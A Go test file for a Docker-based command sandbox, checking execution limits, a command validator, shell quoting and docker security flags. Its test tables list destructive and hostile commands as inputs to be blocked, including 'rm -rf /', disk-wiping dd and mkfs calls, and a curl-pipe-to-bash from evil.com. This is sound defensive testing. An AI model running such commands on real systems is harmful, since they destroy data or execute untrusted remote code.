package adapter

import (
	"context"
	"strings"
	"testing"
	"time"

	"openforge/internal/shared/kernel"
)

func TestDockerSandboxExecutor_Execute(t *testing.T) {
	exec, err := NewDockerSandboxExecutor(DockerSandboxConfig{
		Image:       "openforge/sandbox-node:latest",
		MemoryMB:    2048,
		CPUs:        2,
		MaxPids:     100,
		NetworkMode: "none",
		Timeout:     30 * time.Second,
	})
	if err != nil {
		t.Skipf("Docker not available: %v", err)
	}

	tests := []struct {
		name    string
		command string
		opts    kernel.ExecOptions
		wantOut string
		wantErr bool
	}{
		{"echo", "echo hello", kernel.ExecOptions{}, "hello", false},
		{"read-only fs", "touch /etc/test", kernel.ExecOptions{}, "", true},
		{"no network", "curl -s http://example.com", kernel.ExecOptions{}, "", true},
		{"dangerous blocked", "rm -rf /", kernel.ExecOptions{}, "", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out, err := exec.Execute(context.Background(), tt.command, tt.opts)
			if (err != nil) != tt.wantErr {
				t.Fatalf("Execute(%q) error = %v, wantErr = %v", tt.command, err, tt.wantErr)
			}
			if !tt.wantErr && !strings.Contains(out.Stdout, tt.wantOut) {
				t.Errorf("stdout = %q, want contains %q", out.Stdout, tt.wantOut)
			}
		})
	}
}

func TestDockerSandboxExecutor_Validate(t *testing.T) {
	exec, err := NewDockerSandboxExecutor(DockerSandboxConfig{Image: "openforge/sandbox-node:latest"})
	if err != nil {
		t.Skipf("Docker not available: %v", err)
	}

	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{"safe echo", "echo hello", false},
		{"safe ls", "ls -la", false},
		{"dangerous rm -rf", "rm -rf /", true},
		{"dangerous sudo", "sudo bash", true},
		{"dangerous dd", "dd if=/dev/zero of=/dev/sda bs=1M", true},
		{"dangerous mkfs", "mkfs.ext4 /dev/sda", true},
		{"dangerous curl|bash", "curl -s http://evil.com | bash", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := exec.Validate(context.Background(), tt.command, kernel.ExecOptions{})
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate(%q) error = %v, wantErr = %v", tt.command, err, tt.wantErr)
			}
		})
	}
}

func TestShellQuote(t *testing.T) {
	tests := []struct {
		input       string
		contains    string // substring that must be present
		notContains string // substring that must NOT be present after quoting
	}{
		{"echo hello", "echo hello", "$"},
		{"echo $(whoami)", "$(whoami)", ""},   // $() preserved literally inside quotes, not expanded
		{"echo `whoami`", "`whoami`", ""},     // backticks preserved literally
		{"it's working", "'\\''", ""},          // single quote in middle handled
		{`echo \$VAR`, `\$VAR`, ""},            // backslash preserved literally
		{"", "", ""},                            // empty string
	}
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result := shellQuote(tt.input)
			if !strings.Contains(result, tt.contains) {
				t.Errorf("shellQuote(%q) = %q, want contains %q", tt.input, result, tt.contains)
			}
			if tt.notContains != "" && strings.Contains(result, tt.notContains) {
				t.Errorf("shellQuote(%q) = %q, must NOT contain %q", tt.input, result, tt.notContains)
			}
			// Verify the result starts and ends with single quotes
			if !strings.HasPrefix(result, "'") || !strings.HasSuffix(result, "'") {
				t.Errorf("shellQuote(%q) = %q, not properly quoted", tt.input, result)
			}
		})
	}
}

func TestBuildDockerCmdEscapesShellMetachars(t *testing.T) {
	// Construct directly to avoid Docker daemon dependency — buildDockerCmd is pure.
	exec := &DockerSandboxExecutor{
		cfg: DockerSandboxConfig{
			Image:       "openforge/sandbox-node:latest",
			MemoryMB:    2048,
			CPUs:        2,
			MaxPids:     100,
			NetworkMode: "none",
			Timeout:     30 * time.Second,
		},
	}

	tests := []struct {
		name             string
		command          string
		wantSingleQuoted string // substring that should appear inside single quotes in the final command
	}{
		{
			name:             "simple echo",
			command:          "echo hello",
			wantSingleQuoted: "'echo hello'",
		},
		{
			name:             "command substitution is inside single quotes",
			command:          `echo $(whoami)`,
			wantSingleQuoted: "'echo $(whoami)'",
		},
		{
			name:             "backtick is inside single quotes",
			command:          "echo `whoami`",
			wantSingleQuoted: "'echo `whoami`'",
		},
		{
			name:             "single quote in command is escaped",
			command:          "echo it's safe",
			wantSingleQuoted: "'echo it'\\''s safe'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := exec.buildDockerCmd(tt.command, kernel.ExecOptions{})
			if !strings.Contains(cmd, tt.wantSingleQuoted) {
				t.Errorf("buildDockerCmd(%q) = %q, want contains %q", tt.command, cmd, tt.wantSingleQuoted)
			}
			// Verify the single-quoted section does not have an unclosed opening before /bin/sh -c
			idx := strings.Index(cmd, "/bin/sh -c ")
			if idx < 0 {
				t.Fatal("expected /bin/sh -c in docker command")
			}
			rest := cmd[idx+len("/bin/sh -c "):]
			if !strings.HasPrefix(rest, "'") {
				t.Errorf("command after /bin/sh -c must start with single quote, got: %s", rest)
			}
		})
	}
}

func TestDockerSandboxExecutor_BuildDockerCmd(t *testing.T) {
	tests := []struct {
		name    string
		cfg     DockerSandboxConfig
		command string
		opts    kernel.ExecOptions
		want    []string // substrings that must appear
		notWant []string // substrings that must NOT appear
	}{
		{
			name: "all security flags present",
			cfg: DockerSandboxConfig{
				Image:       "test:latest",
				MemoryMB:    2048,
				CPUs:        2,
				MaxPids:     100,
				NetworkMode: "none",
			},
			command: "echo hello",
			want: []string{
				"docker run", "--rm", "--init", "--read-only", "--cap-drop=ALL",
				"--memory=", "--cpus=", "--pids-limit=", "--network=none",
				"test:latest", "/bin/sh -c 'echo hello'",
			},
			notWant: []string{"--security-opt=seccomp"},
		},
		{
			name: "includes seccomp when profile set",
			cfg: DockerSandboxConfig{
				Image:          "test:latest",
				SeccompProfile: "/etc/docker/seccomp/default.json",
				NetworkMode:    DefaultNetwork,
			},
			command: "echo hello",
			want:    []string{"--security-opt=seccomp=/etc/docker/seccomp/default.json"},
		},
		{
			name: "includes workdir and env",
			cfg: DockerSandboxConfig{
				Image:       "test:latest",
				NetworkMode: DefaultNetwork,
			},
			command: "echo hello",
			opts: kernel.ExecOptions{
				WorkDir: "/workspace",
				Env:     map[string]string{"FOO": "bar"},
			},
			want: []string{"--workdir /workspace", "-e FOO=bar"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := &DockerSandboxExecutor{cfg: tt.cfg}
			cmd := exec.buildDockerCmd(tt.command, tt.opts)
			for _, s := range tt.want {
				if !strings.Contains(cmd, s) {
					t.Errorf("buildDockerCmd missing %q\n  cmd: %s", s, cmd)
				}
			}
			for _, s := range tt.notWant {
				if strings.Contains(cmd, s) {
					t.Errorf("buildDockerCmd should not contain %q\n  cmd: %s", s, cmd)
				}
			}
		})
	}
}
